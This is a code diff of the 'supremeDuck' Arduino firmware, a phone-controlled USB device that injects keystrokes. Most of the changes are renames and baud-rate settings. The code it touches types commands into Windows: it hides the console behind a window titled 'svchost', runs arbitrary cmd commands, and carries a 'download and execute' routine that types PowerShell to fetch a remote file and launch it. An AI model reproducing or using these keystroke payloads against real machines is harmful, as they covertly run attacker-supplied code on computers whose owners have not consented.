@@ -1,54 +1,41 @@
 /*
 supremeDuck project - https://github.com/michalmonday/supremeDuck
 Created by Michal Borowski
+
+Last edited: 24/07/2018
 */
 
 
-/* 
- *  
- *  
- *  
- *  
- *  
- *  
- *  
- *  
- * 
- * 
- */
+#define APP_Version "1.06"                            // it is used to compare it with the app version to make sure that both of them are the same (if they're not the same it will be shown in the mobile app and update will be suggested, first implemented in version 1.03 so it won't give any notice for earlier versions)
+                                                      // ATMEGA 32U4 which is the chip on Arduino Pro Micro has 1024 bytes of EEPROM.
 
+//#define WIFI_DUCKY_SETUP                             // uncomment if you're using "HC-06"
 
-
-
-
-#define Version "1.06"                            // it is used to compare it with the app version to make sure that both of them are the same (if they're not the same it will be shown in the mobile app and update will be suggested, first implemented in version 1.03 so it won't give any notice for earlier versions)
-                                               // ATMEGA 32U4 which is the chip on Arduino Pro Micro has 1024 bytes of EEPROM.
-                                                  
-//#define USE_TX_RX_PINS                       // uncomment this line to use TX/RX pins of pro micro instead of 9/8 pins and software serial library                                                  
+#ifdef WIFI_DUCKY_SETUP
+  #define USE_TX_RX_PINS                             //  TX/RX pins of pro micro instead of 9/8 pins and software serial library 
+  #define MODULE_BAUDRATE 115200                     // use higher baudrate for Esp8266 (better speed for plain text/ducky scripts) 
+#else
+  #define MODULE_BAUDRATE 9600                          //(default baud rate of hc-06) It's the speed of communication between Arduino and HC-06, it shouldn't be changed without additionally changing it on the HC-06.
+#endif
+                                                                                               
 #ifdef USE_TX_RX_PINS
   #define App Serial1                           
 #else
   #include <SoftwareSerial.h>                  // Allows communication between the Arduino and HC-06 module using various I/O pins
-  //SoftwareSerial App(16, 15);                // it could also work
   SoftwareSerial App(9, 8);                    // RX | TX these are pins responsible for communication between the bluetooth/wifi module and arduino
-  //SoftwareSerial App(8, 9);                  // old pinout (less comfortable to solder, now only 1 of these devices has it this way)
 #endif
 
 #include <EEPROM.h>                               // Electrically Erasable Programmable Read-Only Memory, it allows to save some values that will prevail even when the device is disconnected from power.
    
-
-//#define DEBUG_MODE                                // does not execute the code till serial monitor is opened, uncomment to disable
+//#define WAIT_FOR_SERIAL_MONITOR_TO_OPEN 
 //#define LOG_SAVED_ENCODING_EEPROM                 // uncomment to disable
 //#define LOG_SERIAL                                // uncomment to disable
-
-#define HC_BAUDRATE 9600                          //(default baud rate of hc-06) It's the speed of communication between Arduino and HC-06, it shouldn't be changed without additionally changing it on the HC-06.
 
 /*
 #define EEPROM_ADDRESS_TRIGGER_TRICK 0
 trick = plug it in + plug out within 3 secs => special function is triggered(that special function is commented out in "setup" funciton)
 */
                                                   
-
 /* NICOHOOD BOOTKEYBOARD STUFF */
 //#define USE_NICOHOOD_BOOTKEYBOARD               //comment this out if it shouldn't be used (I couldn't get alt+numpad to work with this for some reason so I'd just leave it)
 
@@ -76,7 +63,6 @@ byte Encoding[3][ENCODING_SIZE] = {               //definition only applies to n
   {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x81, 0x81, 0x81}
 }; //saved at EEPROM 1-100, 101-200, 201-300
 
-
 /*
   How this project is using EEPROM space:
   0 - tricky activation for classic rubber ducky plug and execute method (deactivated/commented out, can't be bool, has to be some predefined int that normally would be unlikely to be there)
@@ -89,8 +75,6 @@ byte Encoding[3][ENCODING_SIZE] = {               //definition only applies to n
   1008 - requested name change (after reboot, can't be bool, has to be some random pre-defined int)
   1012 - requested pin change
  */
-
-
 
 #define EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE 1008
 #define EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE 1012
@@ -107,30 +91,23 @@ bool useMultiLangWindowsMethod = true;                          // it's set to t
 #define EEPROM_STARTING_ADDRESS_ENCODING_NAME 302
 #define ENCODING_NAME_SIZE 30
 
-
-
-
 /*
  * keypad values copied from http://forum.arduino.cc/index.php?topic=266688.msg1880647#msg1880647
  * thanks to nickgammon's reply
  */
 
 byte KEYPAD[10] = {234, 225, 226, 227, 228, 229, 230, 231, 232, 233};
-
 unsigned long previousSendingTime = 0;                    // used for sending setting data updates to the phone (current keyboard encoding, multilang thing)
 unsigned long lastOKsendingTime = 0;
-char encodingName[ENCODING_NAME_SIZE] = {"US"};                           // it will store the name of the currently used language encoding so it can be sent and displayed on the application (e.g  US, UK - gb, Deutch - ger, etc.)
-
+char encodingName[ENCODING_NAME_SIZE] = {"US"};           // it will store the name of the currently used language encoding so it can be sent and displayed on the application (e.g  US, UK - gb, Deutch - ger, etc.)
 char commandLineObfuscationString[54] = "echo off & mode 20,1 & title svchost & color 78 & cls";                      // line used to make the command prompt less visible
-
 void SetNewCharEncoding(char *inStr);
-
 unsigned long last_alt_tab_time = 0;
 #define ALT_TAB_AUTORELEASE 1000
 
 void setup()                                    // setup function is a part of every Arduino sketch, it gets called once at the begining
 {
-  App.begin(HC_BAUDRATE);                  // begin communication with the bluetooth module
+  App.begin(MODULE_BAUDRATE);                  // begin communication with the bluetooth module
   //Keyboard.begin();                           // begin emulating keyboard
   myKeyboard.begin();
   Mouse.begin();                                // begin emulating mouse
@@ -139,7 +116,7 @@ void setup()                                    // setup function is a part of e
     Serial.begin(9600);                           // begin serial communication so it's possible to use "Tools -> Serial Monitor" to see the debugging output
   #endif
 
-  #ifdef DEBUG_MODE
+  #ifdef WAIT_FOR_SERIAL_MONITOR_TO_OPEN
     while(!Serial){
       ;
     }
@@ -396,14 +373,14 @@ void MyFuncMouseMove(char *inStr)
   for(byte i=0;i<strlen(inStr);i++){inStr[i]=0;}
 }
 
-void typeKey(int key)
+void TypeKey(int key)
 {
   myKeyboard.press(key);
   delay(50);
   myKeyboard.release(key);
 }
 
-void openRun()
+void OpenRun()
 {
   myKeyboard.press(KEY_LEFT_GUI);
   delay(200);
@@ -413,18 +390,18 @@ void openRun()
   delay(700);
 }
 
-void openCmd()
+void OpenCmd()
 {
-  openRun();  
+  OpenRun();  
   Print("cmd");
-  typeKey(KEY_RETURN); 
+  TypeKey(KEY_RETURN); 
 }
 
 void EnterCommand(char *text)
 {
   Print(text);
   delay(10);
-  typeKey(KEY_RETURN);  
+  TypeKey(KEY_RETURN);  
 }
 
 
@@ -475,7 +452,7 @@ void Check_Protocol(char *inStr)
       ChangeBluetoothCheck();
     }
     
-    if(!strcmp(inStr, "Enter\0")){typeKey(KEY_RETURN);}
+    if(!strcmp(inStr, "Enter\0")){TypeKey(KEY_RETURN);}
     
     if(!strcmp(inStr, "Alt+F4\0")){
         myKeyboard.press(KEY_LEFT_ALT);
@@ -545,19 +522,19 @@ void Check_Protocol(char *inStr)
     
     if(!strcmp(inStr, "VER")){                            // if the mobile phone app asks what version of the code is used on Arduino, to make sure that the same it's not different from the mobile app
         char data[13];
-        sprintf(data,"ver=%s,end", Version);          //format string
+        sprintf(data,"ver=%s,end", APP_Version);          //format string
         App.write(data);                         // send the data to the mobile app or any other bluetooth device that is connected to it right now
         for(byte i=0;i<13;i++){data[i]=0;}            //reset "data" (idk if it's even necessary)
     }
     
     if(IsCmd(inStr, "YT:")){                       //YT:t,end (Youtube)
         ExtractDeliveredText(inStr, 3);
-        openRun();
+        OpenRun();
         //Print("www.youtube.com/embed/2Z4m4lnjxkY?rel=0&autoplay=1");        //trololo 2Z4m4lnjxkY  
         Print("www.youtube.com/embed/");
         Print(inStr);
         Print("?rel=0&autoplay=1");
-        typeKey(KEY_RETURN);   
+        TypeKey(KEY_RETURN);   
     }
 
     if(IsCmd(inStr, "YTB:")){                      //youtube control buttons
@@ -582,28 +559,28 @@ void Check_Protocol(char *inStr)
     
     if(IsCmd(inStr, "WS:")){                     //WS:t,end (website)
         ExtractDeliveredText(inStr, 3);
-        openRun();
+        OpenRun();
         Print(inStr);
-        typeKey(KEY_RETURN); 
+        TypeKey(KEY_RETURN); 
     }
     
     if(IsCmd(inStr, "EP:")){                     //EP:t,end (execute program)
         ExtractDeliveredText(inStr, 3);
-        openRun();
+        OpenRun();
         Print(inStr);
         delay(100);
-        typeKey(KEY_RETURN);  
+        TypeKey(KEY_RETURN);  
     }
     
     if(IsCmd(inStr, "EC:")){                     //EC:t,end (execute command)
         ExtractDeliveredText(inStr, 3);
-        openCmd();
+        OpenCmd();
         delay(500);
         EnterCommand(commandLineObfuscationString);
         Print(inStr);
-        if(StrStartsWith(inStr, "cd \"%USERPROFILE%\\Desktop\" & FOR")){typeKey(KEY_RETURN); delay(50); Print("echo a");}       //exception for a command which creates multiple files (otherwise only one file would be created, echo a is added because command " & exit" wouldn't close the window without something preceding it
+        if(StrStartsWith(inStr, "cd \"%USERPROFILE%\\Desktop\" & FOR")){TypeKey(KEY_RETURN); delay(50); Print("echo a");}       //exception for a command which creates multiple files (otherwise only one file would be created, echo a is added because command " & exit" wouldn't close the window without something preceding it
         Print(" & exit");
-        typeKey(KEY_RETURN);  
+        TypeKey(KEY_RETURN);  
         delay(100);
     }
     
@@ -702,7 +679,7 @@ void Check_Protocol(char *inStr)
           inStr[i] = inStr[i+3];
           if(i == indexType-3){inStr[i] = '\0';}
         }    
-        openCmd(); //("powershell Start-Process cmd -Verb runAs");
+        OpenCmd(); //("powershell Start-Process cmd -Verb runAs");
         delay(500);
         EnterCommand(commandLineObfuscationString);
         Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
@@ -712,7 +689,7 @@ void Check_Protocol(char *inStr)
         Print("'; $down.DownloadFile($url,$file); exit;\" & reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\%USERNAME%\\downloadedfile.");
         Print(fileFormat);
         Print(" /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & exit");
-        typeKey(KEY_RETURN);
+        TypeKey(KEY_RETURN);
     }
     
     if(IsCmd(inStr, "DE:") && StrContains(inStr, ",type:")){                     //DE:t,type:est,end (download and execute)
@@ -728,7 +705,7 @@ void Check_Protocol(char *inStr)
           inStr[i] = inStr[i+3];
           if(i == indexType-3){inStr[i] = '\0';}
         }    
-        openCmd(); //("powershell Start-Process cmd -Verb runAs");
+        OpenCmd(); //("powershell Start-Process cmd -Verb runAs");
         delay(500);
         EnterCommand(commandLineObfuscationString);
         Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
@@ -736,7 +713,7 @@ void Check_Protocol(char *inStr)
         Print("'; $file = 'downloadedfile.");
         Print(fileFormat);
         Print("'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit");
-        typeKey(KEY_RETURN);
+        TypeKey(KEY_RETURN);
   }
 
 
